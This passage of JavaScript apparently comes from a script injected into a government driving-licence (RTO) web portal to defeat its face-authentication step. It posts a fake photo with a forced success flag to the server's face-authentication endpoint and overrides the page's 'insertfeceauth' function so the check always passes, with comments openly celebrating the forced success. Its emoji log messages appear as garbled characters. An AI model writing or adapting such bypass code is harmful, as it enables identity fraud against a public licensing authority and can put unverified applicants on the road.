                $.ajax({
                    type: 'POST',
                    url: 'saveFaceAuthData.do',
                    data: {
                        applno: llappln,
                        rtocode: rtocode,
                        faceres: 1,  // 1 means success
                        CapPho: fakePhoto
                    },
                    dataType: 'json',
                    success: function(data) {
                        console.log("âœ… Server accepted the authentication data");
                    },
                    error: function() {
                        console.log("âš  Server error, but UI still shows success");
                    }
                });
            } catch (err) {
                console.log("âš  Error sending data: " + err.message);
            }

            // Return the successful result
            return Promise.resolve(result);
        };

        // 5. Override insertfeceauth to always succeed
        window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
            console.log("ğŸ”„ Intercepted insertfeceauth with forced success");

            // Always use true for face result
            faceresult = true;

            // Get application number and RTO code if not provided
